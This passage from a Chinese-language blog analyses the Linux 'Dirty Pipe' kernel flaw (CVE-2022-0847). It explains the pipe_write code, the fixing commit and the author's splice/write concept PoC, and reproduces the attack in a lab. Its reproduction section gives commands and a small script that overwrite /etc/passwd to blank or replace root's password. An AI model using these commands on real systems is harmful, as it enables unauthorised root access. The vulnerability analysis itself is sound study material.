<li>此时的<code>anon_pipe_buf_ops</code>不能再与<code>can_merge</code>强关联，暴露了<code>page_cache_pipe_buf_ops</code> 中的<code>can_merge</code>属性是未改变的隐患，就造成了漏洞的产生</li>
</ol>
</li>
<li>漏洞的操作：<ol>
<li>先将pipe_buf的状态设置为<code>PIPE_BUF_FLAG_CAN_MERGE</code> </li>
<li>再通过<code>splice</code>函数调用<code>copy_page_to_iter_pipe</code>函数，此时将pipe_buf中当前需要写入的页的指针指向所打开的文件的缓存页，没有改变pipe_buf原来的can_merge属性(此属性最早本应将之置0的，但是由于数次改动，而没有做这步工作)</li>
<li>最后执行<code>pipe_write()</code>写入操作，向pipe_buf写入脏数据。此时由于pipe_buf指针指向所打开的文件缓存页，且pipe_buf设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code> ，所以没有申请新的页，直接在当前打开的文件缓存页中写入内容，进而实现了该文件内容的篡改</li>
</ol>
</li>
<li>Linux 5.17,2021：<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903">Commit  7ee4446017903  “lib/iov_iter: initialize “flags” in new pipe_buffer”</a>  : 在<code>copy_page_to_iter_pipe()</code>执行完<code>buf-&gt;ops = &amp;page_cache_pipe_buf_ops</code>后设置了flags的初始化<code>buf-&gt;flags = 0</code>，修复了漏洞</li>
</ol>
<h2 id="pipe-write函数分析"><a href="#pipe-write函数分析" class="headerlink" title="pipe_write函数分析"></a>pipe_write函数分析</h2><ol>
<li>为什么了解？除了其涉及到写操作外，还涉及到can_merge标志如何设置，如何判断界面是否可以merge</li>
<li>什么时候续写merge?当向管道中写入数据，如果①管道非空②写入的数据拼接在之前的数据后面长度不会超过一页的大小②设有<code>PIPE_BUF_FLAG_CAN_MERGE</code>的flag，则可以续写</li>
<li>什么时候会设置<code>PIPE_BUF_FLAG_CAN_MERGE</code>的flag?如果无法在上一页续写，则会申请一个新页，并且在非<code>O_DIRECT</code>直接的情况下，则会设置<code>PIPE_BUF_FLAG_CAN_MERGE</code>(默认都会设置这个)</li>
<li>详情见代码</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//https://github.com/torvalds/linux/blob/5274f052e7b3dbd81935772eb551dfd0325dfa9d/fs/pipe.c#L236</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">pipe_write</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *from)</span></span><br><span class="hljs-function"></span>&#123;<br>    ………………<br>    <span class="hljs-comment">//如果 pipe 读者的数量为 0，则向进程发送 SIGPIPE 信号，并返回 EPIPE 错误。</span><br>    <span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>		<span class="hljs-built_in">send_sig</span>(SIGPIPE, current, <span class="hljs-number">0</span>);<br>		ret = -EPIPE;<br>		<span class="hljs-keyword">goto</span> out;<br>	&#125;<br>    ………………<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Only wake up if the pipe started out empty, since otherwise there should be no readers waiting.</span><br><span class="hljs-comment">	 * If it wasn&#x27;t empty we try to merge new data into the last buffer.（ 如果不是空的，我们会尝试将新数据合并到最后一个缓冲区中）</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">	 * That naturally merges small writes, but it also age-aligs the rest of the writes for large writes spanning multiple pages.</span><br><span class="hljs-comment">	 */</span><br>	head = pipe-&gt;head;<br>	was_empty = <span class="hljs-built_in">pipe_empty</span>(head, pipe-&gt;tail);<span class="hljs-comment">//判断head和tail是否相等   </span><br>    <span class="hljs-comment">//按位与运算通常用来对某些位清0或保留某些位。例如把a的高八位清0保留低八位，可作a&amp;255运算(255的二进制数为0000000011111111)</span><br>    <span class="hljs-comment">//此处类似于mod 取余的作用：计算要写入的数据总大小是否是页帧大小的倍数，并将余数保存在 chars 变量中</span><br>	chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<span class="hljs-comment">//size_t total_len = iov_iter_count(to			         </span><br>        <br>  <span class="hljs-comment">//[1]如果管道非空且chars不为0，则尝试从当前最后一页接着写</span><br>	<span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<br>		<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>        <span class="hljs-comment">///注意这里获取pipe_buffer的操作，也是被其他人遗漏掉的一点</span><br>        <span class="hljs-comment">//head - 1。因为head-1，才能得到前一个pipe_buf的page，进而完成续写。</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<span class="hljs-comment">//获取 pipe 头部的缓冲区。</span><br><br>		<span class="hljs-keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;<br>        <span class="hljs-comment">//[2]核心关键</span><br>        <span class="hljs-comment">//判断当前页面是否带有PIPE_BUF_FLAG_CAN_MERGE的flag，且前写入的数据拼接在之前的数据后面长度不超过一页(即写入操作不跨页)，如果都满足，则将 chars 长度的数据写入到当前的缓冲区中</span><br>		<span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>		    offset + chars &lt;= PAGE_SIZE) &#123;<br>			ret = <span class="hljs-built_in">pipe_buf_confirm</span>(pipe, buf);<br>			<span class="hljs-keyword">if</span> (ret)<br>				<span class="hljs-keyword">goto</span> out;<br><br>			ret = <span class="hljs-built_in">copy_page_from_iter</span>(buf-&gt;page, offset, chars, from);<br>			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(ret &lt; chars)) &#123;<br>				ret = -EFAULT;<br>				<span class="hljs-keyword">goto</span> out;<br>			&#125;<br><br>			buf-&gt;len += ret;<br>            <span class="hljs-comment">//如果剩余要写入的数据大小为零，则直接返回。</span><br>			<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">iov_iter_count</span>(from))<br>				<span class="hljs-keyword">goto</span> out;<br>		&#125;<br>	&#125;<br>    <span class="hljs-comment">//[3]如果无法在上一页续写，则另起一页</span><br>	<span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">//判断 pipe 的读者数量是否为零。</span><br>		<span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>			<span class="hljs-built_in">send_sig</span>(SIGPIPE, current, <span class="hljs-number">0</span>);<br>			<span class="hljs-keyword">if</span> (!ret)<br>				ret = -EPIPE;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		head = pipe-&gt;head;<br>        <span class="hljs-comment">//pipe缓冲区未满</span><br>		<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">pipe_full</span>(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>            <span class="hljs-comment">// 获取pipe的缓冲区及pipe的临时页tmp_page，后续用于pipe_buf的初始化</span><br>			<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br>			<span class="hljs-keyword">int</span> copied;<br>            <span class="hljs-comment">//[4]判断该tem_page是否已经分配，如果没有则alloc_page申请一个新的page</span><br>			<span class="hljs-keyword">if</span> (!page) &#123;<br>				page = <span class="hljs-built_in">alloc_page</span>(GFP_HIGHUSER | __GFP_ACCOUNT);<br>				<span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(!page)) &#123;<br>					ret = ret ? : -ENOMEM;<br>					<span class="hljs-keyword">break</span>;<br>				&#125;<br>				pipe-&gt;tmp_page = page;<br>			&#125;<br><br>            <span class="hljs-comment">//使用自旋锁锁住pipe的读者等待队列。再次检测pipe是否被填满，是则终止当前循环，执行下一次循环。</span><br>			<span class="hljs-built_in">spin_lock_irq</span>(&amp;pipe-&gt;rd_wait.lock);<br><br>			head = pipe-&gt;head;<br>			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">pipe_full</span>(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>				<span class="hljs-built_in">spin_unlock_irq</span>(&amp;pipe-&gt;rd_wait.lock);<br>				<span class="hljs-keyword">continue</span>;<br>			&#125;<br>      <span class="hljs-comment">//将struct pipe_inode_info实例的head字段值增加1。并释放自旋锁。</span><br>			pipe-&gt;head = head + <span class="hljs-number">1</span>;<br>			<span class="hljs-built_in">spin_unlock_irq</span>(&amp;pipe-&gt;rd_wait.lock);<br><br>      <span class="hljs-comment">//[5]将新的页放在数组最前面(可能会替换掉原有页面)，初始化页管理结构的相关成员。</span><br>			buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>			buf-&gt;page = page;<br>			buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>			buf-&gt;offset = <span class="hljs-number">0</span>;<br>			buf-&gt;len = <span class="hljs-number">0</span>;<br>            <br>       <span class="hljs-comment">//如果创建pipe时指定了O_DIRECT选项，则将缓冲区的flags字段设置为PIPE_BUF_FLAG_PACKET，否则设置为PIPE_BUF_FLAG_CAN_MERGE。</span><br>       <span class="hljs-comment">//文件操作O_DIRECT使用：https://www.jianshu.com/p/7c891a002a4e</span><br>			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_packetized</span>(filp))<br>				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br>			<span class="hljs-keyword">else</span><br>				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>			pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br>      <span class="hljs-comment">//将数据拷贝到新分配的page中</span><br>			copied = <span class="hljs-built_in">copy_page_from_iter</span>(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br><br>			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(copied &lt; PAGE_SIZE &amp;&amp; <span class="hljs-built_in">iov_iter_count</span>(from))) &#123;<br>				<span class="hljs-keyword">if</span> (!ret)<br>					ret = -EFAULT;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>      <span class="hljs-comment">//设置相应的偏移量字段。</span><br>			ret += copied;<br>			buf-&gt;offset = <span class="hljs-number">0</span>;<br>			buf-&gt;len = copied;<br><br>			<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">iov_iter_count</span>(from))<br>				<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		…… ……<br>&#125;<br><br><span class="hljs-comment">//[https://github.com/torvalds/linux/blob/v5.8/fs/pipe.c#L403](https://github.com/torvalds/linux/blob/v5.8/fs/pipe.c#L403)</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span> <span class="hljs-title">is_packetized</span><span class="hljs-params">(struct file *file)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">return</span> (file-&gt;f_flags &amp; O_DIRECT) != <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//https://github.com/torvalds/linux/blob/1c52283265a462a100ae63ddf58b4e5884acde86/include/linux/pipe_fs_i.h#L132</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">pipe_empty</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> head, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> tail)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">return</span> head == tail;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="POC视角：splice-和write"><a href="#POC视角：splice-和write" class="headerlink" title="POC视角：splice()和write()"></a>POC视角：splice()和write()</h2><p>作者早期概念性POC：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;AAAAA&quot;</span>, <span class="hljs-number">5</span>);<br>&#125;<br><span class="hljs-comment">// ./writer &gt;foo</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-built_in">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;BBBBB&quot;</span>, <span class="hljs-number">5</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// ./splicer &lt;foo |cat &gt;/dev/null</span><br></code></pre></td></tr></table></figure>

<p>仅使用了<code>splice()</code>和<code>write()</code> 函数，那么为什么仅需要这两个函数就可以达成效果？</p>
<ol>
<li><code>splice()</code>利用底层的零拷贝机制，调用<code>copy_page_to_iter_pipe()</code>完成pipe_buf的页和目标文件page_cache的绑定，且在<code>copy_page_to_iter_pipe()</code>中未初始化页面的<code>PIPE_BUF_FLAG_CAN_MERGE</code>属性</li>
<li><code>write()</code> 写入脏数据的时候调用<code>pipe_write()</code>，<code>pipe_write()</code>对带<code>PIPE_BUF_FLAG_CAN_MERGE</code>标签的<code>pipe_buf</code>写时，错误的判定write操作可合并(merge)，进而获取指向待写入文件界面缓存的pipe_buf的指针，且这里向管道写时不存在权限检查，最后导致了非法数据写入文件页面缓存, 实现了任意文件覆盖漏洞。<ol>
<li>如果没有<code>PIPE_BUF_FLAG_CAN_MERGE</code>标签的话，实际上会往<code>pipe-&gt;tmp_page</code>去写，此时就不会写到目标文件中。</li>
</ol>
</li>
</ol>
<p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2019.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="docker安装（失败）"><a href="#docker安装（失败）" class="headerlink" title="docker安装（失败）"></a>docker安装（失败）</h3><ol>
<li>拉取镜像：docker pull ubuntu</li>
<li>启动容器：docker run -it  ubuntu /bin/bash。此为ubuntu20.04版本，内核Linux 3.10.0</li>
<li>安装基本命令：<ol>
<li>由于docker pul下来的为极简版的ubuntu，很多命令都没有，包括vi等</li>
<li>如果直接apt-get update的话，源不对，则很慢，于是考虑换源</li>
<li>在vi等命令没有的情况下，可以使用<strong>cat &gt;xxx.file &lt;EOF</strong>的操作换源，源地址：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/142014944">Ubuntu20.04软件源更换</a><br> <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%208.png" srcset="/img/loading.gif" lazyload>      </li>
<li>换源后执行：apt-get update</li>
<li>安装基本命令：git，python3，python3-pip</li>
</ol>
</li>
<li>使用metarget搭建漏洞环境<ol>
<li>git clone <a target="_blank" rel="noopener" href="https://github.com/brant-ruan/metarget.git">https://github.com/brant-ruan/metarget.git</a></li>
<li>cd metarget/</li>
<li>pip install -r requirements.txt</li>
<li>./metarget cnv install cve-2022-0847 –verbose<ol>
<li>报错six模块缺失：pip3 install six</li>
<li>报错<a target="_blank" rel="noopener" href="https://www.codegrepper.com/code-examples/shell/%2Fusr%2Fbin%2Fadd-apt-repository%3A+No+such+file+or+directory">“/usr/bin/add-apt-repository: No such file or directory” **</a>：**apt-get install software-properties-common ，选6·Asia，和70·shanghai</li>
</ol>
</li>
<li>但是怎么解决报错，最终都安装环境失败</li>
</ol>
</li>
<li>原因：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/66413051/docker-linux-container-kernel-update">docker和宿主机共用同一个系统内核</a>（是我蠢了忘了这茬）<blockquote>
<p>You cannot upgrade kernel <em>inside docker container</em>- the whole point of using Docker containers in contrary to virtualization is that you use the same kernel that your underlying OS does. You have to upgrade your operating system kernel to fix this problem.</p>
</blockquote>
</li>
</ol>
<h3 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h3><ol>
<li>ubuntu18.04安装—失败<ol>
<li>使用metarget搭建漏洞环境，重启之后出现”SMBus Host Controller not enabled”无法开机，尝试多种方案，但无果，放弃<ol>
<li>虽然可以使用tty2进入命令行执行命令，但是不能复制粘贴，手敲命令很烦+觉得不是完美换内核方案，就算了</li>
</ol>
</li>
<li>手动升级内核：内核升级教程参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/75669680">记一次Ubuntu 18.04 内核升级 - 知乎 (zhihu.com)</a>。 但依然出现了上述错误，即使更换了另外一个内核版本依然出现上述问题，无果，放弃</li>
</ol>
</li>
<li>kali上安装—成功<ol>
<li>使用metarget搭建漏洞环境，重启之后出现”SMBus Host Controller not enabled”，但是并没有在这里卡主，等一会即可登录，成功！</li>
</ol>
</li>
</ol>
<h2 id="作者POC的原理"><a href="#作者POC的原理" class="headerlink" title="作者POC的原理"></a>作者POC的原理</h2><ol>
<li>首先创建一个 pipe。接着每次向 pipe 中写入一个页帧大小的数据。理由：从 <code>pipe_write()</code> 可知，每次写入都不会进入 <code>if (chars &amp;&amp; !was_empty)</code> 这个分支，因为写入数据的大小为页帧大小的整数倍时，<code>chars</code> 的值总为零。创建 pipe 的时候没有指定 <code>O_DIRECT</code> 标志，因此在 for 循环中会将每个 <code>pipe_buffer</code> 的标志位设置为 <code>PIPE_BUF_FLAG_CAN_MERGE</code>。</li>
<li>接下来打开要覆写的文件，并通过 <code>splice()</code> 系统调用向 pipe 中写入一个字节。根据 <code>splice()</code> 的实现，将待覆盖的文件从硬盘读取到 <code>page cache</code> 后，会把文件对应的<code>page cache</code>与 <code>pipe_buffer</code> 的 <code>page</code> 字段关联起来，并且不会重置 <code>pipe_buffer</code> 的 <code>flags</code> 字段。也就是说，此时 <code>flags</code> 字段的值仍为 <code>PIPE_BUF_FLAG_CAN_MERGE</code>。</li>
<li>最后<code>write()</code>调用 <code>pipe_write()</code> 之后<ol>
<li>由于写入小于一个页帧大小的数据，会进入 <code>if (chars &amp;&amp; !was_empty)</code> 分支。为了将小于一个页帧的数据写入到前一个 <code>pipe_buffer</code> 中， 此分支获取 <code>pipe_buffer</code> 的时候将 <code>head</code> 值减 1，从而此时 <code>pipe_buffer</code> 的指针指向的是待写入文件的 page cache。</li>
<li>再由于该<code>pipe_buffer</code> 设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志，会进入<code>if ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;offset + chars &lt;= PAGE_SIZE)</code>分支，进而调用<code>copy_page_to_iter_pipe()</code> 完成脏数据写入</li>
</ol>
</li>
</ol>
<h2 id="使用作者的POC改-etc-passwd"><a href="#使用作者的POC改-etc-passwd" class="headerlink" title="使用作者的POC改/etc/passwd"></a>使用作者的POC改/etc/passwd</h2><h3 id="etc-passwd概念"><a href="#etc-passwd概念" class="headerlink" title="/etc/passwd概念"></a>/etc/passwd概念</h3><ol>
<li>背景：历史上Linux的前身，一些基于Unix的系统，是没有shadow这个文件的，用户密码的哈希就保存在/etc/passwd的第二个字段。但是/etc/passwd是全局可读的文件，用户的哈希可能被其他用户所读取。</li>
<li>解决方案：衍生出了/etc/shadow文件。在此之后/etc/passwd的第二列通常设置为x，表示用户密码保存在/etc/shadow中，而/etc/shadow文件只有root用户可以读取和写入，这样就保护了密码哈希不能被第三方爆破。</li>
<li>关于passwd文件各个字段的<a target="_blank" rel="noopener" href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">解释</a><br> <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%209.png" srcset="/img/loading.gif" lazyload><ol>
<li><strong>Username用户名</strong>: 当用户登录时使用。它的长度应该在1到32个字符之间。</li>
<li><strong>Password</strong>:密码 x字符表示加密密码存储在/etc/shadow文件中。请注意，您需要使用passwd命令来计算在CLI中键入的密码的哈希值，或者在/etc/shadow文件中存储/更新密码的哈希值。为空则表示无密码</li>
<li><strong>User ID (UID)用户标识号</strong>: 必须为每个用户分配一个用户ID（UID）。0为root用户保留，UID1-99为其他预定义帐户保留。系统为管理和系统帐户/组保留了更多UID 100-999。</li>
<li><strong>Group ID (GID)组标识</strong>: 主组ID（存储在/etc/group文件中）</li>
<li><strong>User ID Info (GECOS)注释字段</strong>: 它允许添加有关用户的额外信息，例如用户的全名、电话号码等。此字段由finger命令使用。<ol>
<li>也就说这部分的字段可以任意删减无所谓</li>
</ol>
</li>
<li><strong>Home directory用户主目录</strong>: 用户登录时所处目录的绝对路径。如果此目录不存在，则用户目录变为/</li>
<li><strong>Command/shell命令解释程序</strong>: 命令或shell的绝对路径。通常是一个shell。但他也不一定是shell。例如，系统管理员可以使用nologin shell充当用户帐户的shell。此时如果shell设置为/sbin/nologin，并且用户试图直接登录Linux系统，/sbin/nologin shell将关闭登录连接。<ol>
<li>感觉本质上就是登录后首先执行的一段程序？比如nologin执行之后，则不返回shell，而是报错显示连接不上</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="方法一：P牛的手动"><a href="#方法一：P牛的手动" class="headerlink" title="方法一：P牛的手动"></a>方法一：P牛的手动</h3><p>代码：<code>./exp /etc/passwd 1 &quot;oot::0:0:rootx&quot;</code></p>
<p>原理：设置root的密码为空</p>
<p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2010.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="方法二：写个脚本自动化替换上述过程"><a href="#方法二：写个脚本自动化替换上述过程" class="headerlink" title="方法二：写个脚本自动化替换上述过程"></a>方法二：写个脚本自动化替换上述过程</h3><ol>
<li>解决方案：<a target="_blank" rel="noopener" href="https://github.com/imfiver">imfiver</a>/<strong><a target="_blank" rel="noopener" href="https://github.com/imfiver/CVE-2022-0847">CVE-2022-0847</a></strong></li>
<li>原理：把上述gcc编译以及手动执行过程全部写死了。</li>
<li>核心code<ol>
<li><code>passwd_tmp=$(cat /etc/passwd|head)</code> ：head默认值展示前10行。此时<code>passwd_tmp</code>变量为passwd文件中前10行的值</li>
<li><code>$&#123;passwd_tmp/root:x/oot:&#125;</code>：其语法规则为<code>$&#123;变量/查找/替换值&#125;</code>  。即替换<code>passwd_tmp</code>中的<code>root:x</code>为<code>oot:</code> （<code>splice</code>调用时默认已经读了passwd里面第一个字符<code>r</code>） <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2011.png" srcset="/img/loading.gif" lazyload></li>
</ol>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">cp /etc/passwd /tmp/passwd <span class="hljs-comment">//备份passwd文件</span><br>gcc exp.c -o exp -std=c99  <span class="hljs-comment">//编译exp</span><br>passwd_tmp=$(cat /etc/passwd|head)<br>./exp /etc/passwd <span class="hljs-number">1</span> <span class="hljs-string">&quot;$&#123;passwd_tmp/root:x/oot:&#125;&quot;</span>  <span class="hljs-comment">//执行exp</span><br></code></pre></td></tr></table></figure>
</li>
<li>复现： <img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2012.png" srcset="/img/loading.gif" lazyload></li>
<li>缺点：其使用的替换passwd文件的方法并不完美<ol>
<li>描述：<code>root:x</code> 为六个字符，而<code>oot:</code> 为4个，即使加上<code>splice</code>所读取的<code>r</code> 。替换后依然少了一个字符</li>
<li>现象：覆盖不完整，后续存在某个地方多一个字符。如图，其中news这个用户刚刚好是第十行，然后其shell地址就多了一个n。</li>
<li>后果：此时news用户登陆不上(虽然也没什么用)</li>
</ol>
</li>
<li>改进：使用P牛的方法，利用User ID Info (GECOS)注释字段，将注释字段的root改成rootx即可确保字符长度一致性，不会对后续内容进行影响<ol>
<li>可以看到前面P牛方法的图中diff内容，内容更加简洁有效。</li>
</ol>
</li>
</ol>
<p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/The%20Dirty%20Pipe%20Vulnerability/Untitled%2013.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="方法三：改root密码"><a href="#方法三：改root密码" class="headerlink" title="方法三：改root密码"></a>方法三：改root密码</h3><ol>
<li>背景：之前的方案都是将密码去除，那么能否改密码呢？</li>
<li>解决方案：<a target="_blank" rel="noopener" href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a> ，在passwd字段替换的内容改为相应的密码hash</li>
<li>技术背景：<ol>
<li>加密的密码具有固定格式：<code>$id$salt$encrypted</code> ：id表示加密算法，1代表<code>MD5</code>，5代表<code>SHA-256</code>，6代表<code>SHA-512</code> salt表示密码学中的Salt,系统随机生成 encrypted表示密码的hash。</li>
<li>生成加密密码的方法：<code>openssl passwd -1 -salt nosalt corp0ra1</code>.其中salt参数未指定则随机生成一个salt</li>
</ol>
</li>
<li>改进方向<ol>
<li>其使用的是<code>/bin/sh</code>作为shell解释程序，其实也可以改为<code>/bin/bash</code>这种（emm）</li>
